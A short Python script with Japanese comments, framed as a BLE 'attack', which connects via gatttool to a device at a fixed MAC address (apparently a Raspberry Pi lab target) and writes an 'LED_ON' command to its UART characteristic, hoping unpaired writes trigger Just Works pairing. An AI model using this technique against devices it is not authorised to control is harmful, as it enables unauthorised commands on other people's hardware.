import pexpect
import time
import sys
import subprocess

# ============================
# 設定
# ============================
TARGET_MAC = "E4:5F:01:F2:6D:21"
# LED_ON のコマンド (HEX)
COMMAND_HEX = "4C45445F4F4E" 
# 書き込み先のハンドル (UUIDから自動解決するのが難しいので、gatttoolではハンドル指定が確実ですが、
# 今回はUUID指定でトライします。失敗したらハンドル指定に変えます)
NUS_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"

def ble_attack_final():
    print(f"[Info] {TARGET_MAC} に接続して攻撃します...")

    # -t public: Raspberry Pi相手なら public が正解
    cmd = f"gatttool -b {TARGET_MAC} -t public -I"
    child = pexpect.spawn(cmd)
    
    # ログ詳細を表示（デバッグ用）
    # child.logfile = sys.stdout.buffer

    try:
        # 1. 接続
        child.expect(r'\[LE\]>', timeout=5)
        print("[Action] Connecting...")
        child.sendline('connect')
        child.expect('Connection successful', timeout=10)
        print("[Success] 接続成功！")

        # 2. 少し待つ（通信安定化）
        time.sleep(2)

        # 3. コマンド送信（書き込み）
        # ペアリングしていなくても、このコマンドを送ることで
        # 相手が「ペアリングが必要だよ」と返してきて、自動的にJust Worksが走ることがあります
        print(f"[Action] コマンド送信: {COMMAND_HEX}")
        child.sendline(f'char-write-req {0x0025} {COMMAND_HEX}') 
        # ※注意: 0x0025 はNUS RXの一般的なハンドルですが、環境によって変わります。
        # もし動かなければ、UUID指定を試します↓
        # child.sendline(f'char-write-req --uuid={NUS_UUID} --value={COMMAND_HEX}')
        
        # 4. 結果確認待ち
        print("[Info] 応答待機中 (5秒)...")
        try:
            # 成功すれば "Characteristic value was written successfully" が出る
            child.expect('written successfully', timeout=5)
            print("\n[SUCCESS] コマンド送信成功！ LEDを確認してください！\n")
        except:
            print("[Info] 書き込み成功メッセージは出ませんでしたが、処理は進みました。")

        # 5. 終了
        child.sendline('disconnect')
        time.sleep(1)
        child.close()

    except pexpect.TIMEOUT:
        print("\n[Error] タイムアウトしました。")
        print(f"直前の出力:\n{child.before.decode()}")
    
    except Exception as e:
        print(f"\n[Error] {e}")

if __name__ == '__main__':
    # キャッシュ削除
    subprocess.run(["bluetoothctl", "remove", TARGET_MAC], stderr=subprocess.DEVNULL)
    ble_attack_final()